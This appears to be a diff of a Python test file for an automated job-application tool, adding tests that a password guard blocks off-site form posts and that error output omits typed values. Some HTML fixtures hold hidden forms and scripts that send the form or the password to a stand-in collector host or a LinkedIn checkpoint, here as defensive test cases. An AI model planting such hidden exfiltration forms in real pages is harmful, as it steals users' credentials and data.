@@ -1697,6 +1697,48 @@ def test_a_submit_the_guard_stopped_sent_nothing_and_parks(
                        "the run stopped it and nothing was sent"), out
 
 
+def test_a_submit_that_reached_the_site_before_the_guard_stopped_a_post_never_reads_unsent(
+        context, job_folder, catalog_builder, tmp_path, monkeypatch):
+    # final review A-I3: the submit's script posts the application to the
+    # site's own API, then submits a hidden form off the sites. The guard
+    # stops that post; the application went already, so the job never reads
+    # "nothing was sent" (a Re-queue would send it twice)
+    _count_password_fills(monkeypatch)
+    hits: list = []
+    api: list = []
+    context.route("https://collector.example.net/**",
+                  lambda route: hits.append(1) or route.fulfill(body="taken"))
+    _serve_combined(context, "", resume=True, html="""<!doctype html><html><body>
+      <form id="app" onsubmit="return false">
+        <label>First name * <input name="first" required></label>
+        __RESUME__
+        <label>Password * <input type="password" name="pw" autocomplete="new-password"
+          required></label>
+        <button type="button" id="go">Submit application</button>
+      </form>
+      <form id="out" method="post" action="https://collector.example.net/take">
+        <input type="hidden" name="x" value="1"></form>
+      <script>document.getElementById('go').onclick = function () {
+        fetch('/api/applications', {method: 'POST', body: '{}'}).then(function () {
+          document.getElementById('out').submit();
+        });
+      };</script></body></html>""")
+    context.route("https://careers.fabrikam.example/api/**", lambda route: (
+        api.append(route.request.method),
+        route.fulfill(body="{}", content_type="application/json")))
+    _enqueue(job_folder, _COMBINED_URL)
+    runner = _runner(context, tmp_path, auto_apply_submit=True)
+    runner.jev = type("Judge", (_FormAsAccountJudge,),
+                      {"STATE": "application_form", "CONF": 0.9})()
+    out = runner.drain(cap=1)[0]
+    assert api == ["POST"] and hits == []
+    assert "nothing was sent" not in out.reason, out
+    assert out.status in ("needs_human", "submitted"), out
+    assert out.reason.endswith("; the run stopped a post to collector.example.net"), out
+    if out.status == "needs_human":
+        assert apply_queue.load()["jobs"][-1]["tab_note"] == apply_run.CHECK_SENT_NOTE
+
+
 def test_the_account_step_never_types_the_password_into_a_masked_sensitive_box(
         context, job_folder, catalog_builder, tmp_path, monkeypatch):
     typed = _count_password_fills(monkeypatch)
@@ -1766,9 +1808,9 @@ def _routed_unit_run(context, tmp_path, job_folder, html, **settings):
     # the page is not the application's site (`about:blank`)
     ('<label>Password <input type="password" name="pw" required></label>', "blank",
      "a password box on about, outside the application site"),
-    # the planner reads the box as a password; the page says it is text
-    ('<label>Secret word <input type="text" name="pw" autocomplete="new-password" required>'
-     '</label>', "site", "Secret word is not a password box for an account"),
+    # (a text box the planner read as a password by its autocomplete: since
+    # final review B-I2 only a masked input is one,
+    # `test_only_a_masked_input_is_a_password_box`)
     # a masked one-time code or security answer is no account password
     ('<label>One-time password <input type="password" name="otp" required></label>', "site",
      "One-time password is not a password box for an account"),
@@ -1777,7 +1819,11 @@ def _routed_unit_run(context, tmp_path, job_folder, html, **settings):
     # the box's form would post it off the allowed sites
     ('<form action="https://collector.example.net/take" method="post"><label>Password '
      '<input type="password" name="pw" required></label><button>Next</button></form>', "site",
-     "the password box's form posts to collector.example.net, outside the allowed sites")])
+     "the password box's form posts to collector.example.net, outside the allowed sites"),
+    # final review A-M1: LinkedIn may load in the tab and never takes the password
+    ('<form action="https://www.linkedin.com/take" method="post"><label>Password '
+     '<input type="password" name="pw" required></label><button>Next</button></form>', "site",
+     "the password box's form posts to www.linkedin.com, outside the allowed sites")])
 def test_the_master_password_goes_only_into_a_password_input_on_the_application_site(
         context, job_folder, catalog_builder, tmp_path, monkeypatch, html, where, reason):
     typed = _count_password_fills(monkeypatch)
@@ -1792,6 +1838,31 @@ def test_the_master_password_goes_only_into_a_password_input_on_the_application_
         with run._password_guard() as guard:
             run._fill_passwords(digest, plan, run.pages[-1], guard)
     assert typed == []
+
+
+@pytest.mark.parametrize("html, planned", [
+    # final review B-I2: sites put autocomplete="new-password" on an ordinary
+    # box to stop the browser's autofill; that box takes its fact
+    ('<label>City * <input type="text" name="city" autocomplete="new-password" required>'
+     '</label>', "fact"),
+    ('<label for="loc">Location *</label><input id="loc" role="combobox" aria-expanded="false" '
+     'autocomplete="new-password" required>', "fact"),
+    # a masked box is a password box whatever its words
+    ('<label>PIN * <input type="password" name="pin" required></label>', "password")])
+def test_only_a_masked_input_is_a_password_box(
+        context, job_folder, catalog_builder, tmp_path, html, planned):
+    run = _routed_unit_run(context, tmp_path, job_folder, f"<body>{html}</body>")
+    digest = apply_form.extract(run.page)
+    assert len(digest.fields) == 1, digest.fields
+    answers = {"field_0_source": jev.Answer(kind="choice", choice="location",
+                                            probabilities={"location": 0.95}, confidence=0.95)}
+    assert run.catalog.has("location")
+    pf = apply_judge.plan(digest, run.catalog, answers).fields[0]
+    if planned == "fact":
+        assert pf.fact_key and pf.action not in ("skip", apply_judge.PASSWORD_ACTION), pf
+        assert apply_judge.page_facts(digest).passwords == 0, digest.fields
+    else:
+        assert (pf.action, pf.fact_key) == (apply_judge.PASSWORD_ACTION, None), pf
 
 
 @pytest.mark.parametrize("html", [
@@ -1834,6 +1905,33 @@ def test_the_password_guard_stops_a_page_leaving_the_sites_and_lets_go_after(
     assert guard._on is False
     run.page.goto("https://collector.example.net/take")
     assert hits == [1]
+
+
+def test_the_password_guard_stops_a_post_to_linkedin_a_get_may_load(
+        context, job_folder, catalog_builder, tmp_path, monkeypatch):
+    # final review A-M1: LinkedIn is an allowed site for a load and never the
+    # application's site, so a form post there with the password is stopped
+    _count_password_fills(monkeypatch)
+    run = _routed_unit_run(context, tmp_path, job_folder, """<body>
+      <label>Password * <input type="password" name="pw" required></label>
+      <button id="go" onclick="var f = document.createElement('form'); f.method = 'post';
+        f.action = 'https://www.linkedin.com/checkpoint'; document.body.appendChild(f);
+        f.submit()">Next</button>
+      </body>""")
+    hits: list = []
+    context.route("https://www.linkedin.com/**",
+                  lambda route: hits.append(route.request.method) or route.fulfill(body="in"))
+    digest = apply_form.extract(run.page)
+    plan = apply_judge.plan(digest, run.catalog, {})
+    with pytest.raises(apply_run._Parked, match=re.escape(
+            "the form posts to www.linkedin.com, outside the allowed sites; the run stopped "
+            "it and nothing was sent")):
+        with run._password_guard() as guard:
+            run._fill_passwords(digest, plan, run.pages[-1], guard)
+            run.page.click("#go")
+            run.page.wait_for_timeout(300)
+    assert hits == []
+    assert guard.posts == ["POST https://www.linkedin.com/checkpoint"]
 
 
 def test_sends_application_reads_the_button_text():
@@ -2340,6 +2438,28 @@ def hermetic_cli(monkeypatch):
     return monkeypatch
 
 
+def test_main_prints_an_errors_type_and_step_never_its_message(hermetic_cli, monkeypatch,
+                                                               capsys, caplog):
+    # final review A-M6 (RES-05): a Playwright message carries the page's
+    # words and the values typed; the frames go to the log
+    monkeypatch.setattr(apply_run.jev, "get", lambda mode="": jev_harness.judge())
+    message = "Locator.fill: typed 'synthetic-typed-value' into #email"
+
+    class R:
+        def __init__(self, **kw):
+            pass
+
+        def drain(self, cap):
+            raise RuntimeError(message)
+    monkeypatch.setattr(apply_run, "Runner", R)
+    assert apply_run.main(["drain"]) == 1
+    err = capsys.readouterr().err
+    assert "apply_run: error: RuntimeError at " in err, err
+    assert "synthetic-typed-value" not in err and "Locator.fill" not in err, err
+    logged = "\n".join(r.getMessage() for r in caplog.records)
+    assert "RuntimeError" in logged and "synthetic-typed-value" not in logged
+
+
 def test_main_drain_exits_2_when_the_judge_is_unavailable(hermetic_cli, monkeypatch, capsys):
     def _get(mode=""):
         raise jev.JevUnavailable("No TypeSafe API key. Create one at console.typesafe.ai/keys")
@@ -2394,7 +2514,9 @@ def test_main_unexpected_error_exits_1(hermetic_cli, monkeypatch, capsys):
             raise RuntimeError("boom")
     monkeypatch.setattr(apply_run, "Runner", R)
     assert apply_run.main(["drain", "--jev", "typesafe"]) == 1
-    assert "RuntimeError: boom" in capsys.readouterr().err
+    # the type and the step only (final review A-M6)
+    err = capsys.readouterr().err
+    assert "apply_run: error: RuntimeError at " in err and "boom" not in err
 
 
 def test_doctor_prints_one_line_per_row_and_the_profile(tmp_path, capsys, monkeypatch):
